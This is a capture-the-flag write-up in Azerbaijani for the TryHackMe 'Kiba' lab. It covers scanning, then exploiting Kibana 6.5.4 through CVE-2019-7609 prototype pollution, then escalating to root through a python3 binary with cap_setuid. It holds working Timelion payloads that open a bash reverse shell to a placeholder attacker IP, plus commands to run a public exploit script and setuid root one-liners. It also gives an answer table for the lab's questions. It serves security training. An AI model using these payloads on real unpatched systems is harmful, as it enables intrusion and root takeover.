# TryHackMe — Kiba Writeup (Azərbaycanca)

> **Çətinlik:** Asan (Easy)  
> **Kateqoriya:** CVE, RCE, Linux Capabilities, Privilege Escalation  
> **CVE:** CVE-2019-7609 (Kibana Timelion Prototype Pollution RCE)  
> **Link:** https://tryhackme.com/room/kiba

---

## Mündəricat

1. [Kəşfiyyat — Nmap Skanı](#kəşfiyyat)
2. [Kibana — CVE-2019-7609 RCE](#kibana-rce)
3. [Reverse Shell](#reverse-shell)
4. [Privilege Escalation — Linux Capabilities](#privilege-escalation)
5. [Flag-ların Alınması](#flaglar)
6. [Cavablar Xülasəsi](#cavablar-xülasəsi)

---

## Kəşfiyyat

Maşın deploy edildikdən sonra nmap skanı işlədirik:

```bash
nmap -sC -sV -A $TARGET_IP
```

**Nəticə:**

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2
80/tcp   open  http    Apache httpd
5601/tcp open  http    Kibana 6.5.4
```

**Açıq portlar:**
- `22` — SSH
- `80` — HTTP
- `5601` — **Kibana** (əsas hədəf)

`http://TARGET_IP:5601` brauzderdə açırıq — Kibana 6.5.4 interfeysi görünür.

> 💡 Kibana versiyası **6.5.4** — bu **CVE-2019-7609** üçün zəifdir (< 6.6.1)

---

## Kibana RCE

### Boşluq haqqında

**CVE-2019-7609** — Kibana-nın **Timelion** modulundakı **Prototype Pollution** zəifliyidir.

Mexanizm:
```
label.__proto__.env.AAAA  →  /proc/self/environ-a yazılır
NODE_OPTIONS=--require    →  Node.js həmin faylı modul kimi yükləyir
                          →  Kod icra edilir → RCE!
```

Təsir edən versiyalar: Kibana **< 5.6.15** və **< 6.6.1**

---

### Manual Exploit — Timelion

Kibana-da sol menyudan **Timelion** bölməsinə keçirik.

Əvvəlcə dinləyici açırıq:

```bash
nc -lvnp 4444
```

Timelion axtarış sahəsinə aşağıdakı payload-ı yapışdırırıq:

```
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/KALI_IP/4444 0>&1");process.exit()//').props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

**▶ Run** düyməsinə basırıq.

> ⚠️ Əgər işləməsə alternativ payload:

```
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i >& /dev/tcp/KALI_IP/4444 0>&1\'");process.exit()//').props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

---

### Script ilə Avtomatik Exploit

```bash
# Repo-nu yüklə
git clone https://github.com/LandGrey/CVE-2019-7609
cd CVE-2019-7609

# Dinləyici aç (ayrı terminal)
nc -lvnp 4444

# Exploiti işlət
python2 CVE-2019-7609-kibana-rce.py \
  -u http://TARGET_IP:5601 \
  -host KALI_IP \
  -port 4444 \
  --shell
```

---

## Reverse Shell

Uğurlu exploit sonrası:

```
connect to [KALI_IP] from (UNKNOWN) [TARGET_IP] 43346
bash: cannot set terminal process group: Inappropriate ioctl for device
bash: no job control in this shell
kiba@ubuntu:/home/kiba/kibana/bin$
```

`kiba` istifadəçisi olaraq shell əldə etdik ✅

### İlk Yoxlamalar

```bash
# Sudo icazələri
sudo -l
# → sudo: no tty present and no askpass program specified

# Ev qovluğu
cd /home && ls
# → kiba

# Crontab
cat /etc/crontab
```

**Crontab nəticəsi:**
```
*  *  *  *  *   root    cd /root/ufw && bash ufw.sh
*  *  *  *  *   kiba    cd /home/kiba/kibana/bin && bash kibana
```

`ufw.sh` hər dəqiqə root kimi işləyir — amma `/root/ufw/` qovluğuna girişimiz yoxdur:

```bash
ls -la /root/ufw/ufw.sh
# → ls: cannot access '/root/ufw/ufw.sh': Permission denied
```

---

## Privilege Escalation

### Linux Capabilities Yoxlaması

```bash
getcap -r / 2>/dev/null
```

**Nəticə:**
```
/home/kiba/.hackmeplease/python3 = cap_setuid+ep
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
```

🎯 **Kritik tapıntı:**
```
/home/kiba/.hackmeplease/python3 = cap_setuid+ep
```

`cap_setuid` — prosesin UID-ini dəyişməyə icazə verir. `+ep` isə bu capability-nin **effektiv** və **permitted** olduğunu bildirir.

### Root Alma

```bash
/home/kiba/.hackmeplease/python3 -c "import os; os.setuid(0); os.system('cat /root/root.txt')"
```

və ya interaktiv bash üçün:

```bash
/home/kiba/.hackmeplease/python3 -c "import os; os.setuid(0); os.system('/bin/bash -p')"
```

```bash
id
# uid=0(root) gid=1000(kiba) groups=1000(kiba)
```

**Root əldə edildi!** ✅

---

## Flag-ların Alınması

### User Flag

```bash
cat /home/kiba/user.txt
```

### Root Flag

```bash
/home/kiba/.hackmeplease/python3 -c "import os; os.setuid(0); os.system('cat /root/root.txt')"
```

---

## Cavablar Xülasəsi

| Sual | Cavab |
|------|-------|
| Kibana portu? | `5601` |
| CVE nömrəsi? | `CVE-2019-7609` |
| Zəiflik növü? | `Prototype Pollution` |
| Capabilities komandası? | `getcap -r / 2>/dev/null` |
| Capability yolu? | `/home/kiba/.hackmeplease/python3` |
| Capability növü? | `cap_setuid+ep` |

---

## İstifadə Edilən Alətlər

| Alət | Məqsəd |
|------|--------|
| `nmap` | Port və servis skanı |
| `nc (netcat)` | Reverse shell dinləyici |
| `CVE-2019-7609 script` | Avtomatik RCE exploit |
| `getcap` | Linux capability axtarışı |
| `python3` (cap_setuid) | Privilege escalation |

---

## Texniki İzahat — Prototype Pollution

JavaScript-də hər obyektin `__proto__` xassəsi var. Timelion-un `.props()` funksiyası bu xassəni filtrləmədən qəbul edir:

```javascript
// Zərərli sorğu
label.__proto__.env.AAAA = 'require("child_process").exec("...")' 
label.__proto__.env.NODE_OPTIONS = '--require /proc/self/environ'
```

Node.js prosesi yenidən başlayanda:
1. `NODE_OPTIONS` mühit dəyişəni oxunur
2. `--require /proc/self/environ` — `/proc/self/environ` faylı modul kimi yüklənir
3. Həmin faylda artıq bizim zərərli kod var
4. Kod icra edilir → **Reverse Shell** 🎯

---

*Writeup: TryHackMe Kiba — CVE-2019-7609 + Linux Capabilities*
